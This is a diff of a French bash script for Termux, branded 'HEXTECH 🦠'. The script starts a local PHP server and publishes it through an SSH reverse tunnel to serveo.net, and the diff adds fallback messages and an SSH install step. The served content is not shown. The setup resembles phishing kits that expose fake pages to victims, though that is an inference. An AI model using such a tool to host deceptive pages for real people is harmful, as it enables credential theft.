@@ -1,5 +1,3 @@
-#!/bin/bash
-
 # Couleurs
 BLEU='\033[1;34m'
 JAUNE='\033[1;33m'
@@ -11,10 +9,24 @@ demarrer_serveur() {
     echo -e "${BLEU}[•]Démarrage du serveur PHP...${NC}"
     php -S localhost:3000 > /dev/null 2>&1 & # Lancer le serveur en arrière-plan
     sleep 2 # Attendre que le serveur démarre
+
     echo -e "${JAUNE} HEXTECH 🦠 [*]Connexion à Serveo pour générer un lien public👇👇...${NC}"
-    ssh -R 80:localhost:3000 serveo.net
+
+    # Tenter une connexion SSH avec Serveo
+    ssh -R 80:localhost:3000 serveo.net -p 22 2>/dev/null || {
+        echo -e "${ROUGE}[!] Échec de la connexion à Serveo. Essayez une alternative comme Ngrok ou Cloudflared.${NC}"
+        exit 1
+    }
 }
 
+# Vérification si SSH est installé
+if ! command -v ssh &> /dev/null; then
+    echo -e "${ROUGE}[!] SSH n'est pas installé. Installation en cours...${NC}"
+    pkg install openssh -y
+fi
+
+# Appel de la fonction pour démarrer le serveur
+demarrer_serveur
 # Affichage du menu avec style
 clear
 echo -e "${BLEU}"
